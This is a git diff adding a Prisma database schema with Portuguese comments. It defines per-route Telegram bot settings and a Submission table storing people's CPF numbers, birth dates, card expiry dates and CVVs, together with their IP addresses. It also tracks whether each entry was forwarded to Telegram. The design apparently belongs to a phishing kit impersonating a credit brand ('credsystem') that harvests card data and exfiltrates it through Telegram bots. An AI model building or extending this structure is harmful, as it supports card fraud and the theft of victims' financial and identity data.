@@ -1,0 +1,57 @@
+// This is your Prisma schema file,
+// learn more about it in the docs: https://pris.ly/d/prisma-schema
+
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+// Configuração de cada rota (bot telegram, chat_id, etc)
+model RouteConfig {
+  id            String   @id @default(cuid())
+  slug          String   @unique // ex: "credsystem" ou "cred-system"
+  name          String   // Nome amigável ex: "CredSystem Principal"
+  telegramToken String   // Token do bot do Telegram
+  telegramChatId String  // Chat ID para envio
+  isActive      Boolean  @default(true)
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+
+  // Relação com as solicitações
+  submissions   Submission[]
+}
+
+// Solicitações enviadas pelos formulários
+model Submission {
+  id            String   @id @default(cuid())
+  routeSlug     String   // Slug da rota de origem
+  cpf           String
+  birthDate     String?
+  cardExpiry    String?
+  cvv           String?
+  
+  // Status do envio
+  sentToTelegram Boolean  @default(false)
+  telegramError  String?
+  
+  // Metadados
+  ipAddress     String?
+  userAgent     String?
+  createdAt     DateTime @default(now())
+  
+  // Relação com a configuração da rota
+  routeConfig   RouteConfig @relation(fields: [routeSlug], references: [slug])
+}
+
+// Usuário admin para o painel
+model AdminUser {
+  id            String   @id @default(cuid())
+  username      String   @unique
+  passwordHash  String
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+}
